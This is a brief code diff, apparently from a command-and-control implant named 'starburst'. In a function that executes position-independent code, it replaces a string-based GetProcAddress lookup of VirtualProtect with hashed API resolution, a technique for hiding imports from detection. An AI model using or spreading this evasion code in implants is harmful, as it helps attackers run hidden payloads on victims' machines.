@@ -42,9 +42,9 @@ auto declfn starburst::cmd_execute_pic(
     DWORD old_protect = 0;
     typedef BOOL ( WINAPI *fn_VirtualProtect )( LPVOID, SIZE_T, DWORD, PDWORD );
     auto pVirtualProtect = reinterpret_cast<fn_VirtualProtect>(
-        inst.kernel32.GetProcAddress(
-            (HMODULE)inst.kernel32.handle,
-            symbol<LPCSTR>( "VirtualProtect" ) ) );
+        resolve::_api(
+            inst.kernel32.handle,
+            expr::hash_string( "VirtualProtect" ) ) );
 
     if ( !pVirtualProtect ) {
         inst.kernel32.VirtualFree( mem, 0, MEM_RELEASE );
